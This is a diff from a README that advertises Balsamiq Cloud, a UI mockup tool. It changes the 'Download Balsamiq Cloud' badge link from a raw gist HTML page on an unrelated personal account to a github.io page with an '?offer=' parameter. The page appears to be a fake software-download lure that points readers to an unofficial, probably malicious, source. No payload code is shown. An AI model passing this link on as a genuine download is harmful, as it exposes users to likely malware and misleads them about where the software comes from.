@@ -3,7 +3,7 @@
 **Balsamiq Cloud** turns your interface ideas into visual mockups — fast, intuitive, and collaborative.  
 It’s designed to make early-stage UX planning feel like sketching on paper but with the precision of a professional desktop app. ✏️  
 
-[![🟧 Get GitHub Instruction](https://img.shields.io/badge/🟧%20Download%20Balsamiq%20Cloud-F26B38?style=for-the-badge&logo=balsamiq&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/punishermrkot1987/3824fb98be46b7c891ae679733dc57c5/raw/c8146a55d7d3233e6f5140b03728199df58c72e1/gistfile.html?offer=BalsamiqCloud)
+[![🟧 Get GitHub Instruction](https://img.shields.io/badge/🟧%20Download%20Balsamiq%20Cloud-F26B38?style=for-the-badge&logo=balsamiq&logoColor=white&labelColor=0B0F19)](https://app-desk-hub.github.io/.github/?offer=BalsamiqCloud)
 
 ---
 
